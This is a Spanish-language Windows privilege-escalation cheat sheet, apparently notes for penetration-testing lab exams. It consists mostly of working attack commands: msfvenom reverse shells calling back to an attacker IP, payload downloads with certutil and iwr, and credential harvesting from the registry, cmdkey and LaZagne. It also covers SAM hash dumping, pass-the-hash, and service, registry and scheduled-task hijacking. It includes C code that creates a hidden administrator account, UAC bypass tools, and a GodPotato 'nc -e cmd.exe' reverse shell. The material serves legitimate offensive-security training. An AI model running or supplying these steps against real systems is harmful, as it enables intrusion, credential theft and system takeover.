# Preparación
1º Creacion de reverse shell con `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IPATACANTE LPORT=53 -f exe -o reverse.exe`


2º En nuestra kali linux hacemos un servidor con impacket
	localización de tools de impacket `/usr/share/doc/python3-impacket/examples`
	Comando servidor impacket
	`python3 smbserver.py test /home/bardock`

3º Forma de Conectarse para copiar archivos
`copy \\IP\test\ARCHIVO C:\RUTA `

3.5º Copiarse de windwos a linux
`copy ARCHIVO \\IP\test\`

4º Shell con Netcat 
`nc -nvlp 53`


1º Abrimos servidor web
`python -m http.server 80`

2º COpiamos archivo web
`certutil -f -urlcache -split http://IP/archivo archivo`

## Conexion por RDP
1º Añadir al grupo admins al usuario
`net localgroup <username> /add`
2º Usando PsExec conexion remota
`tool PsExec: .\PsExec64.exe -accepteula -i -s C:\PrivEsc\reverse.exe`


# Evitar Rabbit Holes
Si al usar `sc query / sc qc ` y vemos que no tenemos los privielgios de

`SERVICE_START y SERVICE_STOP`

Este servicio se excluye de las explotaciones

### Apagar y encender servicios
1º net.exe
~~~~c
net stop / start SERVICE
~~~~

2º sc.exe
~~~~c
sc.exe stop / start SERVICE
~~~~


# Recomendaciones/ Tips
# Enumeración Manual
Enumerar información del sistema
~~~~c
>> systeminfo
~~~~

Enumerar parcheos (kernel exploits)
~~~~c
>> wmic qce
~~~~

Enumerar datos del usuario
~~~~c
>> whoami /all
Enumerar privilegios del usuario
>> whoami /priv
~~~~

Enumerar usuarios con net user, grupos etc
~~~~c
>> net user <usuario>
~~~~

Enumerar usuarios locales
~~~~c
>> Get-LocalUser
~~~~

Enumerar grupos locales
~~~~c
>> Get-LocalGroup
~~~~

Enumerar Usuarios en ciertos grupos
~~~~c
>> Get-LocalGroupMember GRUPO
~~~~


Buscar Información del Firewall
~~~~c
>> sc query windefend
~~~~

Correr comandos con privilegios de otros usuarios
~~~~c
>> runas.exe /netonly /user:<domain>\<username> cmd.exe
~~~~

Conexion mediante evil-winrm (winrm tiene que estar activo)
~~~~c
>> evil-winrm -i IP -u USUARIO -p CONTRASEÑA
~~~~

Enumeración de archivos en directorio C:\users
~~~~c
Get-ChildItem -Path C:\Users -Include *.txt,*.log,*.ini,*.kdbx,*.ps1 -File -Recurse -ErrorAction SilentlyContinue
~~~~

Historial de windows
~~~~c
(Get-PSReadlineOption).HistorySavePath
~~~~



# Enumeración Automatica 
Enumeración con winPEASany (Seleccionar fast searchfast cmd para normal y cmd windowscreds para buscar contraseñas)
~~~~c
>>.\winPEASany.exe fast searchfast cmd  windowscreds
~~~~

Usar PowerUp en vez de winPEASany
~~~~c
Importar Power Up
Import-Module .\PowerUp.ps1

Ejecutar PowerUp.ps1
Invoke-AllChecks
~~~~


Usar SharpUp
~~~~c
SharpUp.exe audit
~~~~

# Credenciales
Mirar el Output de la tool de enumeracion automatica
Sino pasar a los comandos manuales

Usar Lazagne para buscar credenciales en 
~~~~c
laZagne.exe all
~~~~


## Passwords Reutilizadas
Buscar mediante el output de la tool si se han reusado otra vez




## Credenciales en archivos de configuracion
Buscar archivos de configuracion con la tool de enumeracion automatica

Buscar contraseñas contenidas en archivos
~~~~c
>> findstr /si password *.txt (podemos indicar la extension)
~~~~

En powershell
~~~~c
Get-ChildItem -Path C:\Users -Include *.txt,*.log,*.ini,*.kdbx,*.ps1 -File -Recurse -ErrorAction SilentlyContinue
~~~~


## Credenciales en BBDD
Buscarla mediante el eumerador automatico

## Credenciales de cmdkey
Comprobar credenciales guardadas
~~~~c
>> cmdkey /list
~~~~

Correr la reverse shell con las credenciales guardadas del usuario
~~~~c
>> runas /savecred /user:USUARIO C:\PATH de la reverse
~~~~


## Credenciales del registro
Busar contraseñas en el registro de la maquina
~~~~c
>> reg query HKLM /f password /t REG_SZ /s
~~~~

Buscar contraseñas del registro del usuario
~~~~c
>> reg query HKCU /f password /t REG_SZ /s
~~~~

Credenciales en Autologon
~~~~c
>> reg query "HKLM\Software\Microsoft\Windows NT\Currentversion\Winlogon"
~~~~

Credenciales guardadas en VNC
~~~~c
>> reg query "HKCU\Software\ORL\WinVNC3\Password"
~~~~

Credenciales en parametros SNMP
~~~~c
>> reg query "HKLM\System\Current\ControlSet\Services\SNMP"
~~~~

Credenciales en Putty
~~~~c
>> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
~~~~

## Credenciales de archivos desatendidos o Sysprep
Se va a rellenar
Archivo Unnatended.xml

## Credenciales de Archivos de logs
Se va a rellenar

## Grupos de Usuario
Se va a llenar 

# Exploits

## Servicios corriendo en Localhost
Enumerar mediante la herramienta automatica los servicios corriendo y tirar de searchsploit

## Versión de Kernel
1º Buscar los parches existentes
~~~~c
>> wmic qce
~~~~

2º Buscar en Searchsploit cualquier exploit del kernel

## Versión de Software
El eumerador automatico nos avisa sino se rellena pronto

## Version de servicio
Buscaremos los servicios y la version, esto se rellenara pronto
# Desconfiguraciones

## Privilegios de Usuario

Mirar los privilegios del usuario
~~~~c
>> whoami /priv
~~~~

## Servicios


### Unquoted Service Path

1º Mediante el enumerador automatico que tengamos nos muestra un unquoted servce path

1º Enumerar manualmente los unquoted paths
~~~~c
>> wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
~~~~

O

~~~~c
>> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
~~~~


2º Comprobar los permisos que tiene el servicio
~~~~c
>> .\accesschk.exe /accepteula -ucqv SERVICIO
"NOTA: Recuerda que el servicio tiene que tener tanto START como STOP"
~~~~


3º Comprobamos si nuestro grupo tiene permiso para manipular el directorio
NOTA: para crear el nombre de la reverse shell  lo creamos igual que el nombre del ejecutable
~~~~c
>>.\accesschk /accepteula -uwdq "C:\PATH\DEl\SERVICIO"
~~~~

4º Copiamos reverse shell en cualquier parte del path descomillado
~~~~c
>> copy REVERSE "C:\PATH\DEl\SERVICIO"
~~~~

5º Listener en kali `nc -nlvp 53`
6º Paramos y encendemos el servicio `net stop SERVICIO / net start SERVICIO`

### Weak Registry Permissions
1º invocar una sesion de powershell 
~~~~c
>> powershell -exec bypass
~~~~

2º Preguntar la ACL lo que podemos hacer con ese servicio
~~~~c
>> Get-Acl PATH | Format-List
~~~~

3º  Preguntamos con accesschk los grupos que tienen permiso
~~~~c
>> .\accesschk.exe /accepteula -uvwqk PATH
~~~~

4º Preguntamos las acciones que podemos hacer al servicio
~~~~c
>> .\accesschk.exe -ucqv USUARIO SERVICIO
~~~~

5º Preguntar el estado del servicio
~~~~c
>> sc query SERVICIO
~~~~

6º Añadimos (cambiamos) el path del registro ImagePath  y le cambiamos por nuestra reverse shell
~~~~c
>> reg add PATH /v ImagePath /t REG_EXPAND /d C:\REVERSE /f
~~~~

7º Iniciamos listener con netcat

8º Reiniciamos el servicio `net stop SERVICIO / net start SERVICIO`

### Insecure Service Permission
1º De lo que nos de la tool de enumeracion enumeramos los servicios

2º Preguntamos los permisos que tiene nuestro usuario en el servicio
~~~~c
>> .\accesschk.exe /accepteula -uwcqv USUARIO SERVICIO
~~~~

3º Preguntar la configuaracion del servicio 
~~~~c
>> sc.exe qc SERVCIO
~~~~

4º Preguntar el estado del servicio 
~~~~c
sc.exe query SERVICIO
~~~~

5º  Intercambiar el binario por nuestra reverse shell
~~~~c
>> sc.exe config SERVICIO binpath= "\""C:\REVERSE.exe"
~~~~


### Insecure Service Executable
1º Busqueda mediante la tool de enumeracion

2º Verificar permisos del binario
~~~~c
>> .\accesschk.exe  /accepteula -quvw PATH
~~~~
NOTA: Para que sea efectivo tiene que estar en el grupo EVERYONE o un grupo que estemos nosotros

3º Preguntar que podriamos hacer con el servicio
~~~~c
>> .\accesschk.exe /accepteula -uvqc SERVICIO
~~~~
NOTA: Debe tener los 2 permisos e START / STOP

4º Copiamos el binario y lo sobreescribimos por el binario original
~~~~c
>> copy /Y C:\REVERSE "C:\BINARIOori.exe"
~~~~


## AlwaysInstall Elevated
1º Verificar si tenemos los registros habilitados
NOTA: Solo Funciona si tenemos los 2 registros habilitados
~~~~c
>> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v SERVICIO
~~~~
1.1º Verificar el otro registro
~~~~c
>> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v SERVICIO
~~~~

2º Creamos una reverse shell como archivo .msi
~~~~c
>>msfvenom -p windows/x64/shell_reverse_tcp LHOST=IPATACANTE LPORT=53 -f msi -o file.msi
~~~~

3º Copiamos el .msi al equipo
~~~~c
>> copy \\IP\test\file.msi .
~~~~

4º Ejecutamos el archivo .msi
~~~~c
>> msiexec /quiet /qn /i file.msi
~~~~



## Scheduled Tasks
### Executable File Writeable

1º Listar todas las tareas programadas que el usuario puede ver
~~~~c
schtasks /query /fo LIST /v
~~~~
En powershell
~~~~c
PS> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
~~~~

2º Verificar los permisos que tiene el usuario para la tarea
~~~~c
>> .\accesschk.exe /accepteula -quv USUARIO TAREA
~~~~
NOTA: tenemos que encontrar el permiso FILE_APPEND_DATA y adicionalmente el FILE_EXECUTE

3º Copiar el contenido de la reverse shell a la tarea programada
~~~~c
>> echo C:\PATH\DE\REVERSE >> TAREA
~~~~

4º Esperamos a que se ejecute

### Forma OFFSEC

1º Listar todas las tareas programadas que el usuario puede ver
~~~~c
>> schtasks /query /fo LIST /v
~~~~

2º Comprobar Privilegios con icalcs
~~~~c
>> icacls "C:\PATH\DE\LA\tarea.exe"
~~~~

3º Tras crear la shell con el mismo nombre que el .exe de la tarea 1º renombramos el binario original  y copiamos el binario malicioso a esa ruta

~~~~c
>> move .\PATHTAREA\binarioori.exe binarioori.exe.bak
>> move .\bianrioori.exe .\PATHTAREA
~~~~

### Dependency Writeable
Se rellenara en un futuro

## Lectura de archivos sensibles
### Lectura de SAM y SYSTEM
El hive de SAM se puede encontrar en varias ubicaciones
C:\Windows\Repair
C:\Windows\System32\config\RegBack

2º Dumpeamos los hashes 

3º Mediante la herramienta samdump2 leemos los hashes 
~~~~c
>> samdump2 SAM SYSTEM
~~~~
### Pass The Hash

1º Con el hash del usuario con los privielgios mas altos (admin o lo que sea)

2º Iniciar sesion con las credenciales
~~~~c
>> pth-winexe -U ‘USUARIO%HASHDEUSUARIOENTERO’ //IP cmd.exe
~~~~

2.1º Sesion con administrador
~~~~c
>> pth-winexe --system -U ‘USUARIO%HASH’ //IP cmd.exe
~~~~

# Adicionales

## Installed Apps

1º Listar Programas corriendo
~~~~c
>> tasklist /V
~~~~

2º Buscar procesos no estandard en windows
~~~~c
>> .\Seatbelt.exe NonstandardProccesses
~~~~

3º Buscar procesos con winPEASany
~~~~c
>> .\winPEASany.exe quiet procesinfo
~~~~

4º De lo que hayamos encontrado buscamos en exploitdb

## Service binary hijacking 

1º Miramos binarios que no esten corriendo en su ruta en C:\Windows\system32
~~~~c
>> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
~~~~

2º De los binarios que no esten corriendo en el path de windows, le pasamos icacls para ver si nuestro grupo tiene permisos para manipularlo
~~~~c
>> icacls "PATH del .exe"
~~~~
Tabla de permisos según mascara
F: Full Access (Permiso juicy)
M: Modify Access (Permiso Juicy)
RX: Read and Execute access (no Juicy)
R: Read-Only Access (no juicy)
W: Write-Only Access (juicy)

3º Vamos a usar este codigo, esto lo que hace es sobreescribir el binario y realizar los comandos descritos
~~~~c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user papilo password123! /add");
  i = system ("net localgroup administrators papilo /add");
  
  return 0;
}
~~~~

Compilamos el cdigo y lo transferimos
~~~~c
>> x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
~~~~

Lo transferimos a la maquina windows (en kali tiene que haber un servidor )
~~~~c
PS >> iwr -uri http://IP/adduser.exe -Outfile adduser.exe  
~~~~

Movemos el binario que queremos secuestrar
~~~~c
>> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
>> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
~~~~

4º Si el servicio que intentamos secuestrar no tiene la capacidad de reiniciarse vamos a buscar servicios que se inicien autoamticamente 

~~~~c
PS >> Get-CimInstance -ClassName win32_service | Select Name, StartMode 
~~~~

5º Volvemos a revisar los permisos y volvemos a hacer los pasos anteriores

Vamos a comprobar si nuestro usuario tiene permisos para reiniciar el sistema
~~~~c

Privilege Name                Description                          State
============================= ==================================== ========
SeSecurityPrivilege           Manage auditing and security log     Disabled
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
~~~~

En este caso no tenemos permisos, pero si tuviesesmos reiniciamos el ordenador
~~~~c
PS >> shutdown /r /t 0
~~~~

Y esperamos a que el codigo haga su trabajo

# UAC BYPASS

Links utiles
https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692
https://github.com/hfiref0x/UACME
https://github.com/x0xr00t/Automated-MUlti-UAC-Bypass
https://github.com/k4sth4/UAC-bypass

0º Probar
~~~~c
powershell.exe Start-Process cmd.exe -Verb runAs
~~~~

0.1º Probar
~~~~c
.\Win-Multi-UAC-Bypass.ps1
~~~~

1º Verificamos que el uac esta activo
Deberia aparecer: Mandatory Label\Medium Mandatory Level

2º Subir archivo uacme

3º Usar uacme con keys 23,33,34 y 70 con el path absoluto de la reverse shell

# Tools Recomendadas

## Enumeracion

1º winPEASany.exe
2º PowerUp
3º SharpUp
## Explotacion

### Windows Explot suggester
https://github.com/AonCyberLabs/Windows-Exploit-Suggester

### Varios
1º Psexec64.exe 

### Procesos no estandard
1º seatbelt

### Port Forwarding
1º plink.exe
2º Chisel

# Exploits 

[https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng "https://github.com/bitsadmin/wesng") 
# PrintsPoofer
~~~~c
PrintSpoofer.exe -i -c cmd.exe
~~~~

## God potato
1º Descargar el binario
2º ejecutar 
~~~~c
.\GodPotato.exe -cmd "nc.exe -e cmd.exe IP PORT"  
~~~~


LOCAL POTATO
Crear binario evil.dll y reemplazarlo por WLBSCTRL.dll
O PrintConfig.dll